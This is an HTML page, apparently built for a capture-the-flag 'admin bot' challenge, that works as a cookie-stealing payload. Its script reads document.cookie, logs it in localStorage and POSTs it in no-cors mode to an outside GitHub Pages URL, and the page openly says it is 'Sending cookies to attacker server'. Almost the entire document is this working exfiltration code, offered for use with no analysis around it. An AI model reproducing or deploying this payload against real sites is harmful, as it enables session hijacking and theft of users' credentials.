<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Admin Bot Watcher</title>
</head>
<body>
  <h1>🕵️‍♂️ Admin Bot Watching...</h1>
  <p>Sending cookies to attacker server...</p>

  <script>
    // Replace with YOUR GitHub Pages URL (or wherever your log viewer is hosted)
    const LOG_URL = "https://fire-k.github.io/Pwn_bot/log.html ";

    // Get cookies or other info
    const cookieData = document.cookie || "No cookies found";
    
    // Store cookie in localStorage (shared across pages on same origin)
    let logs = JSON.parse(localStorage.getItem("cookieLogs") || "[]");
    logs.push({ cookie: cookieData, time: new Date().toISOString() });
    localStorage.setItem("cookieLogs", JSON.stringify(logs));

    // Optional: Send to external server if CORS allows (unlikely on GitHub Pages)
    fetch(LOG_URL, {
      method: 'POST',
      body: JSON.stringify({ cookie: cookieData }),
      headers: { 'Content-Type': 'application/json' },
      mode: 'no-cors' // Important: Bypass CORS (but won't confirm success)
    }).catch(() => {});
  </script>
</body>
</html>
